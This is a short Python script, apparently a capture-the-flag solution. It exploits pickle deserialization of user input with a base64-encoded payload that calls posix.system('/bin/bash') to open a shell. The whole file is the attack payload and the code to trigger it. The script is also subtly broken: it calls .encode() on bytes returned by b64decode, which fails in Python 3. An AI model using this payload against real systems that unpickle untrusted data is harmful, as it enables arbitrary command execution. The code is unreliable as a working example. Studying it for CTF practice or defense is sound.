#!/usr/local/bin/python
import pickle
from base64 import b64decode
# pickle.loads(input("pickle: ").split()[0].encode())

query = 'gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAkvYmluL2Jhc2iUhZRSlC4='

print(b64decode(query).encode())

pickle.loads(b64decode(query).split()[0].encode())